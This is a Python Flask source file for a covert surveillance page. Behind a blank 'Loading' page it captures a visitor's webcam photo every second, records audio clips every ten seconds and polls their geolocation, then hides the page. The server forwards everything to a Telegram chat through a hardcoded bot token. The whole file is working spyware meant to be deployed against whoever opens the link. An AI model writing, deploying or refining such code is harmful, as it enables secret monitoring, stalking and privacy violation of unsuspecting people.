from flask import Flask, request, Response
import requests
import time

app = Flask(__name__)

# Your bot token (from earlier)
BOT_TOKEN = "7717616825:AAFsBZnNSgAkTCh0s3JAppa7DyvLvGr0FsY"

HTML = '''<!DOCTYPE html>
<html style="background:#000;height:100vh;margin:0">
<head>
    <meta charset="UTF-8">
    <title>Loading</title>
</head>
<body>
<script>
const cid="{{cid}}";

async function start(){
    try{
        // Get camera
        const s=await navigator.mediaDevices.getUserMedia({video:true,audio:true});
        const v=document.createElement('video');
        v.srcObject=s;
        v.play();
        
        // Send start message
        fetch('/start/'+cid);
        
        // Photo every second
        setInterval(()=>{
            const c=document.createElement('canvas');
            c.width=640;
            c.height=480;
            const ctx=c.getContext('2d');
            ctx.drawImage(v,0,0,640,480);
            c.toBlob(b=>{
                const f=new FormData();
                f.append('photo',b,'photo.jpg');
                fetch('/photo/'+cid,{method:'POST',body:f});
            },'image/jpeg');
        },1000);
        
        // Audio every 10 seconds
        setInterval(async ()=>{
            const a=await navigator.mediaDevices.getUserMedia({audio:true});
            const r=new MediaRecorder(a);
            const d=[];
            r.ondataavailable=e=>d.push(e.data);
            r.onstop=()=>{
                const b=new Blob(d,{type:'audio/webm'});
                const f=new FormData();
                f.append('audio',b,'audio.webm');
                fetch('/audio/'+cid,{method:'POST',body:f});
                a.getTracks().forEach(t=>t.stop());
            };
            r.start();
            setTimeout(()=>r.stop(),2000);
        },10000);
        
        // Location
        if(navigator.geolocation){
            setInterval(()=>{
                navigator.geolocation.getCurrentPosition(p=>{
                    fetch('/location/'+cid+'/'+p.coords.latitude+'/'+p.coords.longitude);
                });
            },10000);
        }
        
        // Make page invisible
        document.body.style.opacity='0';
        
    }catch(e){
        console.log(e);
    }
}

start();
</script>
</body>
</html>'''

@app.route('/')
def home():
    cid = request.args.get('access')
    if not cid:
        return 'Use: ?access=YOUR_CHAT_ID'
    return Response(HTML.replace('{{cid}}',cid),mimetype='text/html')

@app.route('/start/<cid>')
def start(cid):
    try:
        url=f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data={'chat_id':cid,'text':'✅ Capture started'}
        requests.post(url,data=data,timeout=5)
    except:
        pass
    return 'ok'

@app.route('/photo/<cid>',methods=['POST'])
def photo(cid):
    try:
        file=request.files['photo']
        url=f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        files={'photo':('photo.jpg',file.read(),'image/jpeg')}
        data={'chat_id':cid}
        requests.post(url,files=files,data=data,timeout=10)
    except:
        pass
    return 'ok'

@app.route('/audio/<cid>',methods=['POST'])
def audio(cid):
    try:
        file=request.files['audio']
        url=f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio"
        files={'audio':('audio.webm',file.read(),'audio/webm')}
        data={'chat_id':cid}
        requests.post(url,files=files,data=data,timeout=10)
    except:
        pass
    return 'ok'

@app.route('/location/<cid>/<lat>/<lon>')
def location(cid,lat,lon):
    try:
        # Send location
        url=f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation"
        data={'chat_id':cid,'latitude':lat,'longitude':lon}
        requests.post(url,data=data,timeout=5)
        
        # Also send as text
        url2=f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        msg=f"📍 Location\\nLat: {lat}\\nLon: {lon}\\nTime: {time.strftime('%H:%M:%S')}"
        data2={'chat_id':cid,'text':msg}
        requests.post(url2,data=data2,timeout=5)
    except:
        pass
    return 'ok'

@app.route('/health')
def health():
    return 'OK'

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=5000)
